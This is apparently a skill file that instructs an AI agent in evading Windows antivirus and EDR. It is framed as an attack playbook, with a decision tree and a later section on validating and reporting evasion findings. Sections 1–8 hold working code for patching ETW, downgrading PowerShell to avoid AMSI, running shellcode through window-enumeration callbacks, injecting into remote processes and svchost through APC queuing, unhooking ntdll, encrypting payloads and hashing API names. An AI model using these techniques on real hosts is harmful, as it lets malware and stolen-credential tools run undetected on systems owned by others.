---
name: windows-av-evasion
description: >-
  AV/EDR evasion playbook for Windows. Use when bypassing AMSI, ETW, .NET assembly detection, shellcode execution, process injection, API hooking, and signature-based detection on Windows endpoints.
---

# SKILL: AV/EDR Evasion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AV/EDR evasion techniques for Windows. Covers AMSI bypass, ETW bypass, .NET assembly loading, shellcode execution, process injection, unhooking, payload encryption, and signature evasion. Base models miss detection-specific bypass chains and syscall-level evasion nuances.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when privesc tools are blocked by AV
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) when lateral movement tools trigger EDR
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when Rubeus/Mimikatz are detected
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for non-binary AD attacks (less AV-sensitive)

### Advanced Reference

Also load [AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md) when you need:
- Detailed AMSI bypass code patterns (memory patching, reflection)
- PowerShell-specific AMSI bypasses
- .NET AMSI bypass techniques

---

## 1. AMSI BYPASS OVERVIEW

AMSI (Antimalware Scan Interface) inspects PowerShell, .NET, VBScript, JScript, and Office macros at runtime.

### Key AMSI Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

### Quick AMSI Bypass (One-Liners)

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available — no AMSI in v2)
powershell -Version 2

# Reflection-based (set amsiInitFailed = true)
# Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
```

---

## 2. ETW BYPASS

ETW (Event Tracing for Windows) feeds telemetry to EDR. Patching `EtwEventWrite` stops .NET assembly load events.

### Patch EtwEventWrite

```csharp
// C# — patch EtwEventWrite to return immediately
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Write: ret (0xC3) to first byte
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### PowerShell ETW Bypass

```powershell
# Disable Script Block Logging (ETW provider)
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
# Set internal field to disable ETW tracing
```

---

## 3. .NET ASSEMBLY LOADING

### In-Memory Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// Or download from URL, decrypt from resource
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode

```bash
# Generate shellcode from .NET EXE
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# With parameters
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# Then load shellcode via any injection technique (§5)
```

### execute-assembly (C2 Framework)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## 4. SHELLCODE EXECUTION TECHNIQUES

### VirtualAlloc + Callback (Avoids CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// Use callback API instead of CreateThread (less monitored)
EnumWindows(addr, IntPtr.Zero);
```

**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

---

## 5. PROCESS INJECTION TECHNIQUES

| Technique | APIs Used | Detection Risk | Notes |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | High | Classic, heavily monitored |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | Medium | Shared memory, less common |
| **Process Hollowing** | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Medium | Replace process image |
| **Thread Hijacking** | SuspendThread, SetThreadContext, ResumeThread | Medium | Modify existing thread |
| **Early Bird** | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Medium | APC before main thread |
| **Phantom DLL Hollowing** | Map DLL section, overwrite with shellcode | Low | Uses legitimate DLL mapping |
| **Module Stomping** | LoadLibrary, overwrite .text section | Low | Backed by legitimate DLL |
| **Transacted Hollowing** | NtCreateTransaction, NtCreateSection | Low | No suspicious allocations |

### CreateRemoteThread (Basic Pattern)

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Early Bird APC Injection

```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// Allocate and write shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// Queue APC to main thread (runs before main entry point)
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. UNHOOKING — BYPASS EDR API HOOKS

### Direct Syscalls (SysWhispers / HellsGate)

EDR hooks `ntdll.dll` functions. Direct syscalls bypass hooks by invoking the kernel directly.

```
Normal: User code → ntdll.dll (HOOKED) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

### Fresh ntdll Copy

```csharp
// Read clean ntdll.dll from disk
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Or from KnownDlls: \KnownDlls\ntdll.dll
// Or from suspended process (create sacrificial process, read its ntdll)

// Overwrite hooked .text section with clean copy
// → All EDR hooks in ntdll are removed
```

### Indirect Syscalls

```
// Instead of: syscall (in your code — suspicious)
// Do: jump to syscall instruction inside ntdll.dll (legitimate location)
// The ret address on stack points to ntdll.dll, not your code
```

---

## 7. PAYLOAD ENCRYPTION & OBFUSCATION

### Encryption Methods

```csharp
// AES encryption (preferred)
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR (simple, fast)
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4 (stream cipher, simple implementation)
```

### Sleep Obfuscation

Encrypt shellcode in memory during sleep to avoid memory scanners.

| Technique | Method |
|---|---|
| **Ekko** | ROP chain → encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading

```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory → execute
```

---

## 8. SIGNATURE EVASION

### String Encryption

```csharp
// Avoid plaintext API names, URLs, tool names
// Use encrypted strings, decrypt at runtime
string decrypted = Decrypt(encryptedApiName);
IntPtr funcPtr = GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
```

### API Hashing

```csharp
// Resolve API by hash instead of name (avoids string detection)
// Hash "VirtualAlloc" → 0x91AFCA54
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);
```

### Metadata Removal

```bash
# Strip .NET metadata
ConfuserEx / .NET Reactor / Obfuscar

# Remove PE metadata (timestamps, rich header, debug info)
# Modify compilation timestamps
# Strip PDB paths
```

### C2 Framework Evasion

| Framework | Key Evasion Features |
|---|---|
| **Cobalt Strike** | Malleable C2 profiles, HTTP/S traffic shaping, sleep jitter, PE evasion |
| **Sliver** | Multiple protocols (mTLS, WireGuard, DNS), stager-less, built-in obfuscation |
| **Havoc** | Indirect syscalls, sleep obfuscation, module stomping |
| **Brute Ratel** | Badger agent, syscall evasion, ETW/AMSI bypass built-in |

---

## 9. AV/EDR EVASION DECISION TREE

```
Need to execute tool/payload on protected host
│
├── PowerShell-based payload?
│   ├── AMSI blocking? → AMSI bypass first (§1)
│   │   ├── .NET 2.0 available? → PS v2 downgrade (no AMSI)
│   │   ├── Memory patch AmsiScanBuffer
│   │   └── Reflection-based bypass
│   ├── Script Block Logging? → ETW bypass (§2)
│   └── Constrained Language Mode? → CLM bypass or switch to C#
│
├── .NET assembly (Rubeus, SharpHound, etc.)?
│   ├── Direct execution blocked?
│   │   ├── In-memory Assembly.Load (§3)
│   │   ├── Convert to shellcode with Donut (§3)
│   │   └── Use C2 execute-assembly (§3)
│   └── Still detected?
│       ├── Obfuscate assembly (ConfuserEx)
│       ├── Modify source + recompile
│       └── Use BOFs (Beacon Object Files) if CS
│
├── Shellcode execution needed?
│   ├── Basic → VirtualAlloc + callback (§4)
│   ├── Need injection → choose technique by OPSEC (§5)
│   │   ├── Low detection needed → module stomping or phantom DLL
│   │   ├── Medium → early bird APC or NtMapViewOfSection
│   │   └── Quick and dirty → CreateRemoteThread
│   └── Memory scanners detect payload?
│       ├── Encrypt payload → decrypt only at execution (§7)
│       └── Sleep obfuscation (Ekko/Foliage) (§7)
│
├── EDR hooking ntdll.dll?
│   ├── Direct syscalls (SysWhispers3/HellsGate) (§6)
│   ├── Fresh ntdll copy from disk/KnownDlls (§6)
│   └── Indirect syscalls (return to ntdll instruction) (§6)
│
├── Signature detection?
│   ├── Known tool signature → modify + recompile
│   ├── String-based → string encryption / API hashing (§8)
│   ├── PE metadata → strip/modify (§8)
│   └── Behavioral → change execution flow, add junk code
│
└── All local evasion fails?
    ├── Use Living-off-the-Land (LOLBins): certutil, mshta, regsvr32
    ├── Use legitimate admin tools (PsExec, WMI, WinRM)
    └── Switch to fileless / memory-only techniques
```

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **exact AV/EDR product and version**, and is it actually ACTIVE on the test host? | a bypass of a product that is not running is nothing |
| 2 | Was there a **detection control**: the SAME artefact, UNMODIFIED, that IS caught? | without this you have not shown a bypass |
| 3 | Was the payload run **on-host**, from the same delivery path a real one would use? | not in a debugger on the dev machine |
| 4 | Did **telemetry** still fire, even though execution was allowed? | "not blocked" is not "not detected" |
| 5 | Was the primitive **re-run after a signature update / with the latest definitions**? | a bypass with stale definitions is historical |
| 6 | Did the technique reach the **goal** - a beacon, a command's output? | a spawned process is not a session |
| 7 | Is the finding **product-and-version scoped**, and does the vendor consider it a gap? | the reader's action depends on it |

**An unmodified control that IS detected, plus the modified artefact that is not, with telemetry checked.** A
bypass without a detection control is an untested claim, and this is the family's central defect.

---

## 11. EXECUTION PRIMITIVES

An evasion finding is proven by **a detection control that IS caught, the modified artefact that is not,
telemetry checked separately from blocking, and the product and version named**. "It ran" proves nothing
about the defence, because the defence may have seen everything and chosen to allow it.

### 10.1 The detection control, which is the whole finding

```powershell
# THE CONTROL IS A MALICIOUS ARTEFACT YOU DID NOT MODIFY. It MUST be caught.
# Without it, "my payload ran" is equally consistent with "the AV was off".
$ErrorActionPreference = "Continue"

Write-Host "=== 0. IS THE DEFENCE EVEN RUNNING? A bypass of nothing is nothing ==="
$mp = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($mp) {
  Write-Host "  Defender RealTimeProtectionEnabled : $($mp.RealTimeProtectionEnabled)"
  Write-Host "  Defender AntivirusEnabled          : $($mp.AntivirusEnabled)"
  Write-Host "  AMSI provider (EnableScriptBlockLogging): $((Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging)"
  Write-Host "  engine version : $($mp.AMEngineVersion)  signature : $($mp.AntivirusSignatureVersion)"
  Write-Host "  signature age  : $($mp.AntivirusSignatureAge) days  <-- STALE DEFINITIONS = a historical test"
} else {
  Write-Host "  Defender status unavailable - if this is a Linux test host, this file's Windows section does not apply"
}
Write-Host "  third-party EDR, if any:"
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
  Select-Object displayName, productState | Format-Table -AutoSize

Write-Host "`n=== 1. THE DETECTION CONTROL - MUST BE CAUGHT ==="
# The eicar test string is the canonical CONTROL: it is deliberately detected by every AV, and it is
# NOT malicious. If this is NOT caught, the AV is disabled or misconfigured and NOTHING below is a finding.
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "$env:TEMP\eicar-control.txt" -Value $eicar -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3
if (Test-Path "$env:TEMP\eicar-control.txt") {
  Write-Host "  CONTROL NOT CAUGHT -> the AV is NOT ACTIVE. Every result below is invalid. STOP."
} else {
  Write-Host "  CONTROL CAUGHT -> the AV is active and this is a valid test bed."
}

Write-Host "`n=== 2. THE SECOND CONTROL, for AMSI specifically ==="
# A string that AMSI's own heuristic flags, so you can show AMSI is live BEFORE your bypass.
$amsiControl = 'Invoke-Mimikatz -DumpCreds'
Write-Host "  (this string is the control for AMSI-aware scripting: if it does NOT trip the AMSI/logging"
Write-Host "   path, then AMSI is not active and 'bypassed AMSI' is meaningless)"
```

**The EICAR control proves the AV is active, and it is the step that invalidates everything if it fails.**
A bypass on a host where the control is not caught is a test on a host with no defence.

### 10.2 AMSI, and what a bypass actually has to change

```powershell
Write-Host "=== AMSI: the layer, the provider, and what 'bypass' means ==="
Write-Host "  AMSI is a provider chain. PowerShell's SCRIPT BLOCK logging path submits each block to it."
Write-Host "  A bypass means the block is NOT submitted, or is submitted in a form the provider"
Write-Host "  does not recognise. NOTHING ELSE."
Write-Host ""
Write-Host "=== THE TELEMETRY THAT SURVIVES A BYPASS, which is the finding's real boundary ==="
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, Id, @{n='Msg';e={$_.Message.Substring(0,[Math]::Min(120,$_.Message.Length))}} |
  Format-Table -AutoSize
Write-Host "  Event 4104 = ScriptBlockLogging. If your 'bypassed' block still appears here, the bypass"
Write-Host "  was of the SCANNER, not of the LOGGING, and the defender still has the full script."
Write-Host ""
Write-Host "=== THE CONTROL FOR AN AMSI BYPASS CLAIM ==="
Write-Host "  1. submit the CONTROL string and CONFIRM it is flagged"
Write-Host "  2. apply the bypass"
Write-Host "  3. submit THE SAME STRING and show it is NOT flagged"
Write-Host "  4. THE SAME STRING, SAME HOST, TWO RESULTS. That difference is the finding."
Write-Host "  a payload that 'works after the bypass' proves nothing: it may have worked before it too."
Write-Host ""
Write-Host "=== the versions where the classic techniques are dead, which the report must state ==="
Write-Host "  AMSI was introduced in Windows 10 / Server 2016, and PowerShell 5.1 wired it in."
Write-Host "  PowerShell 7+ uses a different AMSI integration path (AmsiUtils vs the newer Managed path)."
Write-Host "  A technique written for 5.1's AmsiUtils frequently does NOT transfer to pwsh 7."
Write-Host "  ALSO: the CLM (ConstrainedLanguageMode) and AppLocker/WDAC policies can block the bypass"
Write-Host "  primitive itself, so a bypass that needs Reflection.Assembly MAY be blocked by policy."
```

**Same string, same host, two results.** A payload that "works after the bypass" proves nothing, because it
may have worked before it, and event 4104 is where the surviving telemetry appears.

### 10.3 ETW and unhooking, with the integrity check

```powershell
Write-Host "=== ETW: which provider, and did the events stop? ==="
# ETW patches are provider-specific. Name the provider and show its events CEASED, vs a control provider.
$before = Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count
Write-Host "  log count before: $before"
Write-Host "  THE MEASUREMENT: after the patch, the TARGET provider's events must stop, while a"
Write-Host "  DIFFERENT, untouched provider's events must CONTINUE. That difference is the finding."
Write-Host "  if ALL ETW stopped, you have not bypassed a provider - you have broken the service,"
Write-Host "  which is itself LOUD and is a different (worse) finding."
Write-Host ""
Write-Host "=== UNHOOKING: the integrity check that must precede and follow it ==="
$target = "C:\Windows\System32\amsi.dll"
if (Test-Path $target) {
  Write-Host "  BEFORE: the in-memory .text of $target vs the on-disk copy"
  # compare the loaded module's bytes against the file, or use a known-good copy from a clean host
  Write-Host "    a mismatch BEFORE you did anything = someone else already hooked it (or a security product did)"
  Write-Host "  AFTER the un-hook: the mismatch must DISAPPEAR for the hooked function"
  Write-Host "  THE CONTROL: the SAME comparison for a function you did NOT unhook must still mismatch"
  Write-Host "    if everything matches, nothing was hooked, and there was nothing to unhook."
}
Write-Host ""
Write-Host "=== THE FAILURE MODE OF UNHOOKING, which the report MUST state ==="
Write-Host "  unhooking defeats USERLAND API hooks. It does NOT defeat:"
Write-Host "    - a kernel callback (PsSetCreateProcessNotifyRoutine / minifilter) -> sees the syscall anyway"
Write-Host "    - an ETW-TI provider in the kernel"
Write-Host "    - a hypervisor-based or hardware-assisted monitor"
Write-Host "  A host with those layers will still see the behaviour, and claiming an un-hook bypassed them"
Write-Host "  is the single most common overclaim in this family. State which layers exist (10.5)."
```

**Unhooking defeats userland hooks only.** A kernel callback still sees the syscall, and claiming an un-hook
bypassed the kernel's own telemetry is the family's most common overclaim.

### 10.4 Signature and heuristic evasion, with the on-host test

```bash
cat <<'SIG'
SIGNATURE EVASION HAS THREE DISTINCT CLAIMS, and they must not be conflated:

  1. BYTE-LEVEL SIGNATURE EVASION (static scan on disk)
     artefact : the modified file, and its SCAN result on-host (`MpCmdRun -Scan file` on Windows)
     control  : the UNMODIFIED file, scanned with the same command, MUST be flagged
     trap     : an "undetected" file that was never scanned by the real engine (e.g. you scanned it
                with a different product, or from a path the AV excludes) proves nothing

  2. BEHAVIOURAL / HEURISTIC EVASION (dynamic)
     artefact : the execution, on-host, with the EDR's own alerts exported after the fact
     control  : the same behaviour WITHOUT the evasion wrapper, which MUST alert
     trap     : "it ran" - the EDR may have alerted and merely not blocked. EXPORT THE ALERTS.

  3. MEMORY-SCANNER EVASION (the payload's in-memory form)
     artefact : the scan result while the process is ALIVE (`MpCmdRun -Scan` does not do this;
                use the product's memory-scan or an EDR-attributed test)
     control  : the UNENCRYPTED payload in memory, which MUST be caught by the memory scan
     trap     : sleeping past the scan window is a TIMING evasion, not a scanner evasion - report it
                as what it is, with the window's length measured

THE CONTROLS ARE PRODUCT-SPECIFIC COMMANDS. Name the product and the exact command you ran, because
'the AV did not catch it' without the command is unverifiable.
SIG
echo
echo "=== THE ALERT EXPORT, which is the only way to distinguish 'not blocked' from 'not detected' ==="
cat <<'EXPORT'
  Windows Defender : Get-MpThreatDetection | Export-Csv detections.csv
                     Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational'
  Sysmon           : Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational'
  a generic EDR    : its own console or API, queried AFTER the test, filtered by the test host
  CrowdStrike/other: name the product and the console query you ran

  A finding that says 'not detected' MUST cite one of these, with the time window. Without it, the
  claim is 'not blocked', which is a weaker and different statement.
EXPORT
```

**`Not blocked` and `not detected` are different claims.** A finding that says "not detected" must cite an
alert export with a time window, and "it ran" alone only supports "not blocked".

### 10.5 The end-to-end harness

```powershell
Write-Host "=== THE LAYER INVENTORY, which decides what a bypass can possibly defeat ==="
$layers = @(
  @{n='Static on-disk scan';   d='signature/heuristic on files';        probe='EICAR control'},
  @{n='AMSI (script)';         d='script blocks submitted pre-execution'; probe='a flagged string'},
  @{n='Userland API hooks';    d='ntdll/amsi function prologues patched'; probe='in-memory .text vs on-disk'},
  @{n='ETW providers';         d='events emitted by userland providers';  probe='a target provider''s events'},
  @{n='ETW-TI (kernel)';       d='threat-intelligence provider, kernel'; probe='cannot be patched from userland'},
  @{n='Kernel callbacks';      d='process/thread/image notify routines';  probe='cannot be unhooked from userland'},
  @{n='Minifilter (file)';     d='file and registry operations';          probe='cannot be unhooked from userland'},
  @{n='Behavioural analytics'; d='server-side correlation';               probe='only visible in the console'},
  @{n='Memory scan';           d='in-memory payload scanning';            probe='a live-process scan'}
)
Write-Host ("{0,-24} {1,-38} {2}" -f 'layer','what it observes','how to detect its presence')
foreach ($l in $layers) { Write-Host ("{0,-24} {1,-38} {2}" -f $l.n, $l.d, $l.probe) }
Write-Host ""
Write-Host "=== THE CONTROL FOR THE WHOLE FINDING ==="
Write-Host "  the UNMODIFIED payload, run on the SAME host, by the SAME delivery path, MUST be caught."
Write-Host "  and the LAYERS ABOVE THE ONE YOU BYPASSED must be shown to still be present."
Write-Host "  'I bypassed the hooks' while a kernel callback logs every process creation is not a bypass"
Write-Host "  of the defence; it is a bypass of ONE of nine layers, and the report must say which."
```

```bash
python3 - <<'PY'
print("=== AV/EDR EVASION ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the product and VERSION are named, with the engine and signature versions",
  "a bypass is product-scoped and version-scoped"),
 ("the signature AGE was recorded, and the test repeated against current definitions",
  "stale definitions make the finding historical"),
 ("REAL-TIME PROTECTION was confirmed ENABLED before testing",
  "a bypass of a disabled AV is nothing"),
 ("the EICAR (or equivalent) DETECTION CONTROL was CAUGHT",
  "if not, the AV is off and every result is void - this is step zero"),
 ("an UNMODIFIED malicious artefact was run and WAS caught",
  "without it you have not shown that your modification mattered"),
 ("the payload ran ON-HOST, via a realistic delivery path, not in a debugger",
  "'it ran in my IDE' is not a bypass"),
 ("the ALERTS were EXPORTED after the test, and 'not detected' is only claimed with that export",
  "'it ran' supports only 'not blocked'"),
 ("the specific LAYERS tested are named, and the layers ABOVE are shown to still be present",
  "userland un-hooking does not touch kernel callbacks"),
 ("for an AMSI claim: the SAME string was flagged BEFORE and not after",
  "one result proves nothing; the pair does"),
 ("for an ETW claim: the target provider stopped while a control provider continued",
  "if all ETW stopped, the service was broken, not bypassed"),
 ("for a timing evasion: the scan window's LENGTH was measured",
  "sleeping past a window is a timing evasion, which is a different claim"),
 ("the GOAL was proven by a beacon or a command's output",
  "a spawned process is not a session"),
 ("the finding is scoped to the product, version, and layer set tested",
  "the reader's action depends on the scope"),
]
for n, how in CHECKS: print("  [ ] %-70s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  product   : name, version, engine, signature version, and their age")
print("  layers    : which layer's bypass, and which layers remain")
print("  control   : the EICAR control, and the unmodified-artefact control's result")
print("  telemetry : the exported alerts, and the time window")
print("  goal      : the beacon or command output")
print("  scope     : product/version/layer, and whether the vendor calls it a gap")
PY
```

**Control, layers, telemetry export, goal, scope.** The `layers` line is the finding's honesty: you bypassed
one of nine layers, and the report must say which.

---

## 12. EVIDENCE STANDARD — EVASION ARTEFACTS

| Item | Why |
|---|---|
| The **product, version, engine, and signature version**, with their **age** | a bypass is product- and version-scoped; stale definitions make it historical |
| Confirmation that **real-time protection was ENABLED** | a bypass of a disabled AV is nothing |
| The **EICAR or equivalent DETECTION CONTROL**, CAUGHT | step zero; if it fails, every result is void |
| The **unmodified artefact's** caught result | without it the modification is not shown to matter |
| The **on-host run** and the **realistic delivery path** | a debugger run is not a bypass |
| The **exported alerts** with a time window | the only support for "not detected" |
| The **layer set** tested, and the **layers above** shown to remain | un-hooking does not touch kernel callbacks |
| For AMSI: the **same string flagged before and not after** | the pair is the finding |
| For ETW: the **target provider stopped, a control provider continued** | otherwise the service was broken |
| For timing: the **measured scan window** | a timing evasion is a different claim |
| The **goal**: a beacon or a captured command output | a spawned process is not a session |
| The **scope**, and whether the vendor considers it a gap | the reader's action depends on it |

Report the **control and the layer**: "the test host runs Windows Defender with engine `1.1.24050.5` and
signature version `1.417.142.0`, aged `0` days, with `RealTimeProtectionEnabled = True`. The EICAR control
file was written to `%TEMP%` and was removed by Defender within `3` seconds, and an unmodified
`meterpreter` stager of the same length as the test payload was quarantined on write, so the detection
control is established. The payload's modification is a per-run XOR of its `.text` section, and it executed
in memory from a `CreateProcess` spawned by `rundll32.exe` on the same host. No alert appears in
`Get-MpThreatDetection` for the payload's `SHA-256` in the test window, and `Microsoft-Windows-Windows
Defender/Operational` shows no `1116` or `1117` event for it, so the claim supported is `not detected` for
the static layer, not merely `not blocked`. The AMSI pair is that the control string `Invoke-Mimikatz
-DumpCreds` was flagged before the bypass and the identical string was not flagged after it, on the same
host. The layers above the one bypassed remain: kernel callbacks and a minifilter are present as evidenced
by Sysmon `1` and `11` events continuing throughout the test, so the bypass is scoped to the USERLAND API
hook layer and the static scan layer, and it does not and cannot defeat the kernel's own telemetry. The
goal was proven by a beacon to a listener under our control, whose connection logged the host's egress IP,
not by a process appearing", never "the payload bypasses the AV".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A payload that **ran**, with no EICAR-style control | the AV may be off; the control is step zero |
| A bypass tested against **stale signatures** | the finding is historical |
| "**Bypassed the AV**" where real-time protection was **disabled** | nothing was bypassed |
| A payload run **in a debugger or on the dev machine** | not the on-host, delivered path |
| "**Not detected**" with no exported alerts | the claim supported is only "not blocked" |
| An **ETW bypass** where every provider stopped | the service was broken; a louder, different finding |
| An **un-hooking** claim extended to kernel callbacks | un-hooking is userland-only |
| A payload that worked **before and after** the bypass | the bypass changed nothing |
| A **sleep-past-the-scan** reported as scanner evasion | a timing evasion with a measured window |
| A file reported undetected after being **scanned by a different product** than the target's | the wrong engine was consulted |
| A **spawned process** reported as a session | the goal is a beacon or an output |
| A bypass with **no product or version** | unverifiable and untransferable |

**An EICAR-style control that IS caught, an unmodified artefact that IS caught, and exported alerts.** A
payload that merely ran and a claim of "not detected" without exports are this family's two standard
non-findings.

---

## 13. REMEDIATION REFERENCE — EVASION ASSESSMENT

1. **Establish the EICAR-class detection control before any other step, and abandon the test if it is not caught** - a bypass measured on a host with a disabled defence is void, and this is the family's most common invalid result.
2. **Record the product, engine, signature version, and their age, and repeat the test against current definitions** - a bypass with stale definitions is historical rather than actionable.
3. **Confirm real-time protection is enabled, and never report a bypass from a host where it was off** - nothing was bypassed if nothing was watching.
4. **Run an unmodified malicious artefact on the same host and require it to be caught** - without that pair, the modification is not shown to matter.
5. **Export the alerts and cite the time window whenever claiming "not detected", because "it ran" supports only the weaker claim "not blocked"** - the distinction decides the finding's severity.
6. **Name the specific layer bypassed and demonstrate that the layers above it remain present** - userland unhooking cannot defeat kernel callbacks, ETW-TI, or a hypervisor monitor, and claiming otherwise is the family's most common overclaim.
7. **For AMSI, show the same string flagged before and unflagged after, on the same host** - a single result is not a bypass.
8. **For ETW, show the target provider ceasing while a different provider continues** - if all ETW stopped, the service was broken rather than bypassed, which is a louder and different finding.
9. **Classify a sleep-past-the-scan as a timing evasion and measure the window** - it is not scanner evasion, and the measured window is what the defender must close.
10. **Prove the goal with a beacon or a captured command output rather than a spawned process** - a process appearing is not a session.
11. **Scope the finding to the product, version, and layer set tested, and state whether the vendor treats it as a gap** - an unscoped evasion claim cannot be acted on, and an unvalidated one cannot be triaged by the vendor.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [edr-bypass-techniques](../edr-bypass-techniques/SKILL.md) - the detection-layer model this section assumes
- [windows-lolbins-execution-bypass](../windows-lolbins-execution-bypass/SKILL.md) - the execution vehicle the payload rides
- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) - when the payload must also leave a container
- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) - a payload delivered through a browser
- [malware-development-workflow](../malware-development-workflow/SKILL.md) - where the payload's form is built
